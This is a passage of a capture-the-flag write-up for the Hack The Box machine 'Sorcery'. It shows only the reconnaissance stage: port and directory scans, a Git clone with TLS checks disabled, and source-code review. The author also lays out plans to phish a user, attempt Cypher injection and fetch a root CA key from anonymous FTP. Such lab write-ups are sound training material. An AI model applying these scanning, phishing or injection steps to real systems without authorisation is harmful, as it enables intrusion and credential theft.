---
title: Sorcery [Insane]
published: false
date: 2025-06-22
tags: [htb, linux, nmap, ssh, docker, pspy, tesseract, netpbm, xwud, freeipa, sudo, privesc, cypher injection, ftp, mail, dirsearch, dns, phising, webauthn, devtools]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/sorcery-htb-season8
image: /assets/img/sorcery-htb-season8/sorcery-htb-season8_banner.png
---

# Sorcery HTB Season 8
## Machine information
Author: [tomadimitrie](https://app.hackthebox.com/users/775445)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -p- --min-rate 10000 -oA scans/quickscan_alltcp 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 23:22 EDT
Warning: 10.129.xx.xx giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.xx.xx
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
```

```bash
└─$ sudo nmap -p22,443 -sC -sV -oA scans/details_scan 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 23:23 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.030s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)
|_  256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)
443/tcp open  ssl/http nginx 1.27.1
|_http-title: Did not follow redirect to https://sorcery.htb/
| ssl-cert: Subject: commonName=sorcery.htb
| Not valid before: 2024-10-31T02:09:11
|_Not valid after:  2052-03-18T02:09:11
|_http-server-header: nginx/1.27.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     sorcery.htb
```

Just scan only port `22` and `443`, let's go through `443` first.

### Web & Source Code Enumeration
Go to `https://sorcery.htb` and redirect to `https://sorcery.htb/auth/login`.

![Login Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_login_page.png)

We also got the passkey login at `https://sorcery.htb/auth/passkey`.

![Passkey Login](/assets/img/sorcery-htb-season8/sorcery-htb-season8_passkey_login.png)

Check the registration page at `https://sorcery.htb/auth/register`.

![Registration Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_registration_page.png)

Found that there is a registration key field but only for **sellers** account.

When hover on the *our repo* word, it gonna pop out at the left side of the corner with a link to `https://git.sorcery.htb/nicole_sullivan/infrastructure`.

![Our Repo](/assets/img/sorcery-htb-season8/sorcery-htb-season8_our_repo.png)

Notice that we found another subdomain `git.sorcery.htb`. <br>
&rarr; Let's add it to `/etc/hosts` file.
```bash
10.129.xx.xx     git.sorcery.htb sorcery.htb
```

Let's check out the git repo.

![Git Repo](/assets/img/sorcery-htb-season8/sorcery-htb-season8_git_repo.png)

Got some source code and this case need audit carefully for leak credentials or some vulnerabilities. <br>
But now let's go through the website first, we gonna move back to this part latter on.

Let's register normal account and login following credentials.
```bash
username: test123
password: test123
```

![Home Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_home_page.png)

After login sucess, we can see that we are the client and can only see lists of maybe SPELLS :)) or whatever at `https://sorcery.htb/dashboard/store`. <br>
&rarr; Let's view 1 product and see what we can do.

![Product Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_product_page.png)

Nothing special, just a title of the product and a description. The different is only there is a product id assigned to it like this `https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f`. <br>
&rarr; Let's go throught profile page and see what we can do.

![Profile Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_profile_page.png)

We can see the ID of our client user, the `Enroll Passkey` button.

![Enroll Passkey](/assets/img/sorcery-htb-season8/sorcery-htb-season8_enroll_passkey.png)

Seems really interesting, put that aside, here is the tech stack of the website.

![Tech Stack](/assets/img/sorcery-htb-season8/sorcery-htb-season8_tech_stack.png)

Though that this website gonna vulnerable to this [CVE-2025-29927](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware) so I ran with nuclei template and it is a false positive :)).

I went through [disearch](https://github.com/maurosoria/dirsearch) to found if there is some hidden files or directories or maybe some else.

```bash
└─$ dirsearch -u https://sorcery.htb/ -x 503
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/DEPTHS_Season8/Sorcery/reports/https_sorcery.htb/__25-06-14_23-46-47.txt

Target: https://sorcery.htb/

[23:46:47] Starting: 
[23:47:43] 308 -   30B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[23:48:12] 308 -   37B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
                                                                             
Task Completed
```

![404 Page](/assets/img/sorcery-htb-season8/sorcery-htb-season8_404_page.png)

Nothing special, let's back to the part where we found the `https://git.sorcery.htb/nicole_sullivan/infrastructure`. <br>
&rarr; Jump to discovery time.

First, let's clone this to our machine for better audit and analysis.

```bash
└─$ git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
Cloning into 'infrastructure'...
fatal: unable to access 'https://git.sorcery.htb/nicole_sullivan/infrastructure.git/': server verification failed: certificate signer not trusted. (CAfile: /etc/ssl/certs/ca-certificates.crt CRLfile: none)
```

Got this error, so the SSL certificate is not trusted. <br>
&rarr; Let's disable it.

```bash
└─$ git -c http.sslVerify=false clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
Cloning into 'infrastructure'...
remote: Enumerating objects: 169, done.
remote: Counting objects: 100% (169/169), done.
remote: Compressing objects: 100% (142/142), done.
remote: Total 169 (delta 8), reused 169 (delta 8), pack-reused 0 (from 0)
Receiving objects: 100% (169/169), 136.24 KiB | 1.89 MiB/s, done.
Resolving deltas: 100% (8/8), done.
```

Got it, here is the structure of the repo.

```bash
└─$ tree .                                                                   
.
├── backend
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── Dockerfile
│   ├── Rocket.toml
│   └── src
│       ├── api
│       │   ├── auth
│       │   │   ├── login.rs
│       │   │   └── register.rs
│       │   ├── auth.rs
│       │   ├── blog
│       │   │   └── get.rs
│       │   ├── blog.rs
│       │   ├── debug
│       │   │   └── debug.rs
│       │   ├── debug.rs
│       │   ├── dns
│       │   │   ├── get.rs
│       │   │   └── update.rs
│       │   ├── dns.rs
│       │   ├── products
│       │   │   ├── get_all.rs
│       │   │   ├── get_one.rs
│       │   │   └── insert.rs
│       │   ├── products.rs
│       │   ├── webauthn
│       │   │   ├── passkey
│       │   │   │   ├── finish_authentication.rs
│       │   │   │   ├── finish_registration.rs
│       │   │   │   ├── get.rs
│       │   │   │   ├── start_authentication.rs
│       │   │   │   └── start_registration.rs
│       │   │   └── passkey.rs
│       │   └── webauthn.rs
│       ├── api.rs
│       ├── db
│       │   ├── connection.rs
│       │   ├── initial_data.rs
│       │   ├── models
│       │   │   ├── post.rs
│       │   │   ├── product.rs
│       │   │   └── user.rs
│       │   └── models.rs
│       ├── db.rs
│       ├── error
│       │   └── error.rs
│       ├── error.rs
│       ├── main.rs
│       ├── state
│       │   ├── browser.rs
│       │   ├── dns.rs
│       │   ├── kafka.rs
│       │   ├── passkey.rs
│       │   ├── privileges.rs
│       │   └── webauthn.rs
│       └── state.rs
├── backend-macros
│   ├── Cargo.lock
│   ├── Cargo.toml
│   └── src
│       └── lib.rs
├── dns
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── convert.sh
│   ├── docker-entrypoint.sh
│   ├── Dockerfile
│   ├── src
│   │   └── main.rs
│   └── supervisord.conf
├── docker-compose.yml
└── frontend
    ├── components.json
    ├── Dockerfile
    ├── next.config.mjs
    ├── package.json
    ├── package-lock.json
    ├── postcss.config.mjs
    ├── public
    │   ├── next.svg
    │   └── vercel.svg
    ├── src
    │   ├── api
    │   │   ├── client.ts
    │   │   └── error.ts
    │   ├── app
    │   │   ├── auth
    │   │   │   ├── layout.tsx
    │   │   │   ├── login
    │   │   │   │   ├── actions.tsx
    │   │   │   │   └── page.tsx
    │   │   │   ├── logout
    │   │   │   │   └── route.tsx
    │   │   │   ├── passkey
    │   │   │   │   └── page.tsx
    │   │   │   ├── register
    │   │   │   │   ├── actions.tsx
    │   │   │   │   └── page.tsx
    │   │   │   └── tabs.tsx
    │   │   ├── dashboard
    │   │   │   ├── blog
    │   │   │   │   └── page.tsx
    │   │   │   ├── debug
    │   │   │   │   ├── actions.tsx
    │   │   │   │   ├── page-client.tsx
    │   │   │   │   └── page.tsx
    │   │   │   ├── dns
    │   │   │   │   ├── actions.tsx
    │   │   │   │   ├── page-client.tsx
    │   │   │   │   └── page.tsx
    │   │   │   ├── layout.tsx
    │   │   │   ├── new-product
    │   │   │   │   ├── actions.tsx
    │   │   │   │   ├── page-client.tsx
    │   │   │   │   └── page.tsx
    │   │   │   ├── page.tsx
    │   │   │   ├── profile
    │   │   │   │   ├── actions.tsx
    │   │   │   │   ├── page.tsx
    │   │   │   │   └── passkey.tsx
    │   │   │   ├── store
    │   │   │   │   ├── all-tabs.tsx
    │   │   │   │   ├── breadcrumbs.tsx
    │   │   │   │   ├── page.tsx
    │   │   │   │   └── [product]
    │   │   │   │       ├── not-found.tsx
    │   │   │   │       └── page.tsx
    │   │   │   ├── tabs-inner.tsx
    │   │   │   └── tabs.tsx
    │   │   ├── favicon.ico
    │   │   ├── globals.css
    │   │   ├── layout.tsx
    │   │   ├── page.tsx
    │   │   └── providers.tsx
    │   ├── components
    │   │   ├── misc
    │   │   │   └── theme-provider.tsx
    │   │   └── ui
    │   │       ├── alert.tsx
    │   │       ├── breadcrumb.tsx
    │   │       ├── button.tsx
    │   │       ├── card.tsx
    │   │       ├── checkbox.tsx
    │   │       ├── form.tsx
    │   │       ├── input.tsx
    │   │       ├── label.tsx
    │   │       ├── table.tsx
    │   │       ├── tabs.tsx
    │   │       ├── toaster.tsx
    │   │       ├── toast.tsx
    │   │       └── use-toast.ts
    │   ├── entity
    │   │   ├── dns-entry.ts
    │   │   ├── post.ts
    │   │   ├── product.ts
    │   │   ├── user-server.ts
    │   │   └── user.ts
    │   ├── hooks
    │   │   └── useAuth.tsx
    │   ├── lib
    │   │   └── utils.ts
    │   └── protect
    │       └── protect.tsx
    ├── tailwind.config.ts
    └── tsconfig.json

44 directories, 123 files
```

That's alot, let's see if we can found some leak credentials or something else.

```bash
└─$ gitleaks detect --source . --verbose

    - │╲
    │ ○
    - ░
    ░    gitleaks

12:18AM INF 1 commits scanned.
12:18AM INF scan completed in 127ms
12:18AM INF no leaks found
```

So [gitleaks](https://github.com/gitleaks/gitleaks) found nothing. <br>
&rarr; Let's go through some git log.

```bash
└─$ git log --oneline --all
acb753d (HEAD -> main, origin/main, origin/HEAD) Final version
```

```bash
└─$ git log --stat --all
commit acb753dd975a639f2dbc28ee8fd4d67adc50e609 (HEAD -> main, origin/main, origin/HEAD)
Author: nicole_sullivan <nicole_sullivan@sorcery.htb>
Date:   Wed Oct 30 18:14:43 2024 +0000

    Final version

 backend-macros/Cargo.lock                                 |   47 ++
 backend-macros/Cargo.toml                                 |   12 +
 backend-macros/src/lib.rs                                 |  222 ++++++++++
 backend/Cargo.lock                                        | 3086 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 backend/Cargo.toml                                        |   32 ++
 backend/Dockerfile                                        |   44 ++
 backend/Rocket.toml                                       |    2 +
 backend/src/api.rs                                        |    7 +
 backend/src/api/auth.rs                                   |  188 ++++++++
 backend/src/api/auth/login.rs                             |   77 ++++
 backend/src/api/auth/register.rs                          |   52 +++
 backend/src/api/blog.rs                                   |    1 +
 backend/src/api/blog/get.rs                               |   16 +
 backend/src/api/debug.rs                                  |    1 +
 backend/src/api/debug/debug.rs                            |   74 ++++
 backend/src/api/dns.rs                                    |    2 +
 backend/src/api/dns/get.rs                                |   16 +
 backend/src/api/dns/update.rs                             |   29 ++
 backend/src/api/products.rs                               |    3 +
 backend/src/api/products/get_all.rs                       |   22 +
 backend/src/api/products/get_one.rs                       |   23 +
 backend/src/api/products/insert.rs                        |  121 +++++
 backend/src/api/webauthn.rs                               |    1 +
 backend/src/api/webauthn/passkey.rs                       |    7 +
 backend/src/api/webauthn/passkey/finish_authentication.rs |   92 ++++
 backend/src/api/webauthn/passkey/finish_registration.rs   |   52 +++
 backend/src/api/webauthn/passkey/get.rs                   |   29 ++
 backend/src/api/webauthn/passkey/start_authentication.rs  |   56 +++
 backend/src/api/webauthn/passkey/start_registration.rs    |   61 +++
 backend/src/db.rs                                         |    3 +
 backend/src/db/connection.rs                              |   62 +++
 backend/src/db/initial_data.rs                            |  317 +++++++++++++
 backend/src/db/models.rs                                  |    3 +
 backend/src/db/models/post.rs                             |    9 +
 backend/src/db/models/product.rs                          |   24 +
 backend/src/db/models/user.rs                             |   77 ++++
 backend/src/error.rs                                      |    1 +
 backend/src/error/error.rs                                |   57 +++
 backend/src/main.rs                                       |  185 ++++++++
 backend/src/state.rs                                      |    6 +
 backend/src/state/browser.rs                              |    7 +
 backend/src/state/dns.rs                                  |   21 +
 backend/src/state/kafka.rs                                |    6 +
 backend/src/state/passkey.rs                              |   11 +
 backend/src/state/privileges.rs                           |   17 +
 backend/src/state/webauthn.rs                             |    7 +
 dns/Cargo.lock                                            |  451 +++++++++++++++++++
 dns/Cargo.toml                                            |   10 +
 dns/Dockerfile                                            |   57 +++
 dns/convert.sh                                            |   17 +
 dns/docker-entrypoint.sh                                  |    5 +
 dns/src/main.rs                                           |  100 +++++
 dns/supervisord.conf                                      |   26 ++
 docker-compose.yml                                        |  147 +++++++
 frontend/.eslintrc.json                                   |    3 +
 frontend/Dockerfile                                       |   43 ++
 frontend/components.json                                  |   17 +
 frontend/next.config.mjs                                  |    6 +
 frontend/package-lock.json                                | 6050 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 frontend/package.json                                     |   47 ++
 frontend/postcss.config.mjs                               |    8 +
 frontend/public/next.svg                                  |    1 +
 frontend/public/vercel.svg                                |    1 +
 frontend/src/api/client.ts                                |   28 ++
 frontend/src/api/error.ts                                 |   19 +
```

Save this creds for later use `nicole_sullivan@sorcery.htb`. <br>
&rarr; Hmm, maybe go through `disearch` again with `https://git.sorcery.htb/` if there is a chance to uncover some new stuffs.

```bash
└─$ dirsearch -u https://git.sorcery.htb/ -x 503
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/DEPTHS_Season8/Sorcery/reports/https_git.sorcery.htb/__25-06-15_00-37-05.txt

Target: https://git.sorcery.htb/

[00:37:05] Starting:                                                                                                                                                                                                                                                                                                        
[00:37:18] 404 -    0B  - /.well-known/acme-challenge                       
[00:37:18] 404 -    0B  - /.well-known/apple-app-site-association           
[00:37:18] 404 -    0B  - /.well-known/acme-challenge/dtfy                  
[00:37:18] 404 -    0B  - /.well-known/caldav
[00:37:18] 404 -    0B  - /.well-known/assetlinks.json
[00:37:18] 404 -    0B  - /.well-known/apple-developer-merchant-domain-association
[00:37:18] 404 -    0B  - /.well-known/browserid
[00:37:18] 404 -    0B  - /.well-known/carddav
[00:37:18] 404 -    0B  - /.well-known/ashrae
[00:37:18] 404 -    0B  - /.well-known/dnt-policy.txt
[00:37:18] 404 -    0B  - /.well-known/csvm
[00:37:18] 404 -    0B  - /.well-known/core
[00:37:18] 404 -    0B  - /.well-known/genid
[00:37:18] 404 -    0B  - /.well-known/est
[00:37:18] 404 -    0B  - /.well-known/dnt
[00:37:18] 404 -    0B  - /.well-known/hoba
[00:37:18] 404 -    0B  - /.well-known/host-meta
[00:37:18] 404 -    0B  - /.well-known/host-meta.json
[00:37:18] 404 -    0B  - /.well-known/jwks.json
[00:37:18] 404 -    0B  - /.well-known/ni
[00:37:18] 404 -    0B  - /.well-known/keybase.txt
[00:37:18] 404 -    0B  - /.well-known/openorg
[00:37:18] 404 -    0B  - /.well-known/jwks
[00:37:18] 404 -    0B  - /.well-known/posh
[00:37:18] 404 -    0B  - /.well-known/reload-config
[00:37:18] 404 -    0B  - /.well-known/repute-template
[00:37:18] 404 -    0B  - /.well-known/time
[00:37:18] 404 -    0B  - /.well-known/void
[00:37:18] 404 -    0B  - /.well-known/timezone
[00:37:18] 200 -    1KB - /.well-known/openid-configuration
[00:37:18] 404 -    0B  - /.well-known/stun-key
[00:37:18] 200 -  206B  - /.well-known/security.txt
[00:37:18] 404 -   10B  - /.well-known/webfinger                            
[00:37:26] 303 -   38B  - /admin  ->  /user/login                           
[00:37:26] 303 -   38B  - /admin/  ->  /user/login                          
[00:37:36] 200 -  701B  - /api/swagger                                      
[00:37:36] 404 -   19B  - /api/v1/                                          
[00:37:36] 404 -   19B  - /api/v1
[00:37:36] 404 -   19B  - /api/v1/swagger.json
[00:37:36] 404 -   19B  - /api/v1/swagger.yaml
[00:37:37] 404 -    0B  - /assets/fckeditor                                 
[00:37:37] 404 -    0B  - /assets/pubspec.yaml                              
[00:37:37] 404 -    0B  - /assets/js/fckeditor                              
[00:37:37] 404 -    0B  - /assets/npm-debug.log                             
[00:37:37] 404 -    0B  - /assets/file                                      
[00:37:52] 303 -   41B  - /explore  ->  /explore/repos                      
[00:37:52] 200 -   18KB - /explore/repos                                    
[00:37:52] 301 -   58B  - /favicon.ico  ->  /assets/img/favicon.png         
[00:37:58] 303 -   38B  - /issues  ->  /user/login                          
[00:38:18] 404 -   19B  - /robots.txt                                       
[00:38:22] 200 -  279B  - /sitemap.xml                                      
[00:38:30] 200 -   10KB - /user/login/                                      
[00:38:31] 401 -   50B  - /v2                                               
[00:38:31] 401 -   50B  - /v2/_catalog                                      
[00:38:31] 401 -   50B  - /v2/
[00:38:31] 404 -   19B  - /v2/keys/?recursive=true                          
[00:38:31] 404 -   19B  - /v2/api-docs                                      
                                                                             
Task Completed
```

Here we go, let's go through and see if there is some interesting stuffs.

![openid-configuration](/assets/img/sorcery-htb-season8/sorcery-htb-season8_openid_configuration.png)

![login-oauth-key](/assets/img/sorcery-htb-season8/sorcery-htb-season8_login_oauth_key.png)

Found this one in `https://git.sorcery.htb/login/oauth/keys` but did not know what to do with it. <br>
&rarr; Back to source code discovery.

Got some interesting stuffs.

```rust
// /backend/src/db/initial_data.rs
use crate::api::auth::create_hash;
use crate::db::models::post::Post;
use crate::db::models::product::Product;
use crate::db::models::user::{User, UserPrivilegeLevel};
use uuid::Uuid;

pub async fn initial_data() {
    dotenv::dotenv().ok();
    let admin_password = std::env::var("SITE_ADMIN_PASSWORD").expect("SITE_ADMIN_PASSWORD");
    let admin = User {
        id: Uuid::new_v4().to_string(),
        username: "admin".to_string(),
        password: create_hash(&admin_password).expect("site admin hash"),
        privilege_level: UserPrivilegeLevel::Admin,
    };
    admin.save().await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing Training".to_string(),
        description:
            "Hello, just making a quick summary of the phishing training we had last week. \
        Remember not to open any link in the email unless: \
        a) the link comes from one of our domains (<something>.sorcery.htb); \
        b) the website uses HTTPS; \
        c) the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can't be hacked). "
                .to_string(),
    }
    .save()
    .await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing awareness".to_string(),
        description:
        "There has been a phishing campaign that used our Gitea instance. \
        All of our employees except one (looking at you, @tom_summers) have passed the test. \
        Unfortunately, Tom has entered their credentials, but our infosec team quickly revoked the access and changed the password. \
        Tom, make sure that doesn't happen again! Follow the rules in the other post!"
            .to_string(),
    }
        .save()
        .await;
```

Hmm, **Phising Training** sounds like we gonna use `nicole_sullivan@sorcery.htb` and phising someone else to click on the link that they also give use a hint `<something>.sorcery.htb` to get creds :>. <br>
Also internal use `FTP` server to store the private key of the root CA. <br>

```rust
// /backend/src/db/connection.rs
use async_once::AsyncOnce;
use lazy_static::lazy_static;
use neo4rs::{query, Graph};
use serde::Deserialize;
use uuid::Uuid;

use backend_macros::Model;

use crate::db::initial_data::initial_data;

lazy_static! {
    pub static ref GRAPH: AsyncOnce<Graph> = AsyncOnce::new(async {
        dotenv::dotenv().ok();
        let user = std::env::var("DATABASE_USER").expect("DATABASE_USER");
        let password = std::env::var("DATABASE_PASSWORD").expect("DATABASE_PASSWORD");
        let host = std::env::var("DATABASE_HOST").expect("DATABASE_HOST");
        Graph::new(host.clone(), user, password)
            .await
            .unwrap_or_else(|_| panic!("Graph: {host}"))
    });
    pub static ref JWT_SECRET: String = Uuid::new_v4().to_string();
    pub static ref REGISTRATION_KEY: AsyncOnce<String> = AsyncOnce::new(async {
        let mut configs = Config::get_all().await;
        if configs.len() != 1 {
            panic!("Found {} configs instead of 1", configs.len());
        }
        configs.remove(0).registration_key
    });
}

#[derive(Deserialize, Model)]
struct Config {
    is_initialized: bool,
    registration_key: String,
}

pub async fn migrate(graph: &Graph) {
    let mut configs = Config::get_all().await;
    let config = if !configs.is_empty() {
        configs.remove(0)
    } else {
        let config = Config {
            is_initialized: false,
            registration_key: Uuid::new_v4().to_string(),
        };
        config.save().await;
        config
    };
    if config.is_initialized {
        return;
    }

    initial_data().await;

    let mut tx = graph.start_txn().await.unwrap();
    tx.run(query(
        "MATCH (config: Config) SET config.is_initialized = true",
    ))
    .await
    .unwrap();
    tx.commit().await.unwrap();
}
```

This file is used to initialize the database with the initial data. And we can see that is type of query: <br>
```sql
MATCH (config: Config) SET config.is_initialized = true
```
Will it be vulnerable to cypher injection? <br>

Found out that there is `registration_key` that if we recall back to the registration page, we can see that there is a field for `registration_key`. <br>
&rarr; Thinking of there will be a cypher injection where we can query to get the `registration_key` and even can change the admin password also. But these assumptions are just guessing based on the source code. We need to discover more and then go through them in the application.

Checking the `docker-compose.yml` file, we can found out that:
```yml
// /docker-compose.yml
services:
  backend:
    restart: always
    platform: linux/amd64
    build:
      dockerfile: ./backend/Dockerfile
      context: .
    environment:
      WAIT_HOSTS: neo4j:7687, kafka:9092
      ROCKET_ADDRESS: 0.0.0.0
      DATABASE_HOST: ${DATABASE_HOST}
      DATABASE_USER: ${DATABASE_USER}
      DATABASE_PASSWORD: ${DATABASE_PASSWORD}
      INTERNAL_FRONTEND: http://frontend:3000
      KAFKA_BROKER: ${KAFKA_BROKER}
      SITE_ADMIN_PASSWORD: ${SITE_ADMIN_PASSWORD}
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/8000"]
      interval: 5s
      timeout: 10s
      retries: 5

  frontend:
    restart: always
    build: frontend
    environment:
      WAIT_HOSTS: backend:8000
      API_PREFIX: ${API_PREFIX}
      HOSTNAME: 0.0.0.0
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
      interval: 5s
      timeout: 10s
      retries: 5

  neo4j:
    restart: always
    image: neo4j:5.23.0-community-bullseye
    environment:
      NEO4J_AUTH: ${DATABASE_USER}/${DATABASE_PASSWORD}
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/7687"]
      interval: 5s
      timeout: 10s
      retries: 5

  kafka:
    restart: always
    build: ./kafka
    environment:
      CLUSTER_ID: pXWI6g0JROm4f-1iZ_YH0Q
      KAFKA_NODE_ID: 1
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://localhost:9092
      KAFKA_PROCESS_ROLES: broker,controller
      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@localhost:9093
      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
      KAFKA_LOG_DIRS: /var/lib/kafka/data
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1
    ports:
      - "9092:9092"
      - "9093:9093"
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/kafka/9092"]
      interval: 5s
      timeout: 10s
      retries: 5

  dns:
    restart: always
    build: dns
    environment:
      WAIT_HOSTS: kafka:9092
      KAFKA_BROKER: ${KAFKA_BROKER}

  mail:
    restart: always
    image: mailhog/mailhog:v1.0.1

  ftp:
    restart: always
    image: million12/vsftpd:cd94636
    environment:
      ANONYMOUS_ACCESS: true
      LOG_STDOUT: true
    volumes:
      - "./ftp/pub:/var/ftp/pub"
      - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"
      - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/21"]
      interval: 5s
      timeout: 10s
      retries: 5

  gitea:
    restart: always
    build:
      dockerfile: gitea/Dockerfile
      context: .
    environment:
      GITEA_USERNAME: ${GITEA_USERNAME}
      GITEA_PASSWORD: ${GITEA_PASSWORD}
      GITEA_EMAIL: ${GITEA_EMAIL}
      USER_UID: 1000
      USER_GID: 1000
      GITEA__service__DISABLE_REGISTRATION: true
      GITEA__openid__ENABLE_OPENID_SIGNIN: false
      GITEA__openid__ENABLE_OPENID_SIGNUP: false
      GITEA__security__INSTALL_LOCK: true
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
      interval: 5s
      timeout: 10s
      retries: 5

  mail_bot:
    restart: always
    platform: linux/amd64
    build: mail_bot
    environment:
      WAIT_HOSTS: mail:8025
      MAILHOG_SERVER: ${MAILHOG_SERVER}
      CA_FILE: ${CA_FILE}
      EXPECTED_RECIPIENT: ${EXPECTED_RECIPIENT}
      EXPECTED_DOMAIN: ${EXPECTED_DOMAIN}
      MAIL_BOT_INTERVAL: ${MAIL_BOT_INTERVAL}
      SMTP_SERVER: ${SMTP_SERVER}
      SMTP_PORT: ${SMTP_PORT}
      PHISHING_USERNAME: ${PHISHING_USERNAME}
      PHISHING_PASSWORD: ${PHISHING_PASSWORD}
    volumes:
      - "./certificates/generated/RootCA.crt:/app/RootCA.crt"

  nginx:
    restart: always
    build: nginx
    volumes:
      - "./nginx/nginx.conf:/etc/nginx/nginx.conf"
      - "./certificates/generated:/etc/nginx/certificates"
    environment:
      WAIT_HOSTS: frontend:3000, gitea:3000
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/443"]
      interval: 5s
      timeout: 10s
      retries: 5
    ports:
      - "443:443"
```

Found something interesting: <br>
- The async processing flow: <br>
    - Backend → Kafka (port 9092) → DNS service (port 53)
    - Mail bot → MailHog → SMTP processing
- Gitea is for source code management.
- MailHog for email testing.
- FTP for file sharing and we can see they contain `.crt` and `.key` of the root CA.

Let's go through some file at `db` directory.

```rust
// /backend/src/db/models/user.rs
use std::fmt::{Display, Formatter};

use serde::{Deserialize, Deserializer, Serialize, Serializer};

use backend_macros::Model;

use crate::state::privileges::PRIVILEGES;

#[derive(Clone, Copy, PartialOrd, PartialEq, Debug)]
pub enum UserPrivilegeLevel {
    Client = 0,
    Seller = 1,
    Admin = 2,
}

impl Display for UserPrivilegeLevel {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", *self as isize)
    }
}

impl UserPrivilegeLevel {
    const fn from_level(level: usize) -> Option<Self> {
        match level {
            0 => Some(Self::Client),
            1 => Some(Self::Seller),
            2 => Some(Self::Admin),
            _ => None,
        }
    }
}

impl Serialize for UserPrivilegeLevel {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        serializer.serialize_u64(*self as _)
    }
}

impl<'de> Deserialize<'de> for UserPrivilegeLevel {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let level = usize::deserialize(deserializer)?;
        Ok(UserPrivilegeLevel::from_level(level).unwrap())
    }
}
#[derive(Model, Debug, Deserialize)]
pub struct User {
    pub id: String,
    pub username: String,
    pub password: String,
    #[transient(fetch = "fetch_privilege_level", save = "save_privilege_level")]
    pub privilege_level: UserPrivilegeLevel,
}

impl User {
